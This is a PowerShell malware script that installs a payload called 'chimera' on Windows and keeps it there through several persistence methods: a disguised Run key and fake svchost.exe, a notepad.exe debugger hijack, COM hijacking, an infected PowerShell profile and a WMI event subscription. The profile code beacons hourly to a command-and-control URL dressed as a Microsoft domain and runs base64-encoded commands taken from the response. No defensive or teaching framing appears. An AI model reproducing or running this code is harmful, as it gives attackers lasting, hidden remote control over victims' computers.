# registry_persistence.ps1 - Multiple, hidden registry entries
$signature = @"
[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll", SetLastError=true)]
public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
"@
Add-Type -MemberDefinition $signature -Name Win32 -Namespace API

# 1. Classic Run key (obvious)
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateHelper" -Value "$env:TEMP\svchost.exe" -Force

# 2. Image File Execution Options (IFEO) - Debugger hijacking
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" -Name "Debugger" -Value "C:\Windows\System32\cmd.exe /c start $env:TEMP\chimera.exe" -Force

# 3. COM Hijacking - More stealthy
$clsid = "{00000000-0000-0000-0000-000000000000}"
New-Item -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" -Name "(Default)" -Value "$env:TEMP\chimera.dll" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" -Name "ThreadingModel" -Value "Both" -Force

# 4. PowerShell Profile (User and Machine)
$maliciousCode = @"
`$global:chimera = {
    # Beacon to C2 every hour
    while(`$true) {
        try {
            `$response = Invoke-WebRequest -Uri "https://cdn.microsoftupdate.com/check/v6" -UseBasicParsing
            if(`$response.Content.Contains('CHM-ACTIVE')) {
                # Execute command from C2
                `$cmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$response.Headers['X-Command']))
                iex `$cmd
            }
        } catch {}
        Start-Sleep -Seconds 3600
    }
}
Start-Job -ScriptBlock `$chimera
"@
$maliciousCode | Out-File -FilePath "$env:USERPROFILE\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1" -Force
$maliciousCode | Out-File -FilePath "$env:WINDIR\System32\WindowsPowerShell\v1.0\profile.ps1" -Force

# 5. WMI Event Subscription - Persists across reboots
$filterArgs = @{
    EventNamespace = 'root\cimv2'
    Name = 'ChimeraFilter'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    QueryLanguage = 'WQL'
}
$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $filterArgs

$consumerArgs = @{
    Name = 'ChimeraConsumer'
    CommandLineTemplate = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\chimera.ps1`""
}
$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
} | Out-Null
